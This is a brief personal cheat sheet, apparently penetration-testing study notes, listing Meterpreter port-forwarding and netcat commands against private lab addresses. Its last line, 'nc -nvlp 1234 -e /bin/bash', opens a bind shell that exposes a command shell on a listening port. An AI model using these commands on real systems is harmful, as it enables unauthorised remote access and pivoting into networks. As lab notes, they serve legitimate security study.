---
dg-publish: true
---
# Netcat and Shell Commands

```bash
portfwd add -l 1234 -p 80 -r 10.0.27.99
portfwd list
nc (IPaddress) (port number)
nc -nv 10.4.20.244 80
nc -nvlp 1234
nc -nv 10.4.21.221 1234
nc -nvlp 1234 -e /bin/bash
```
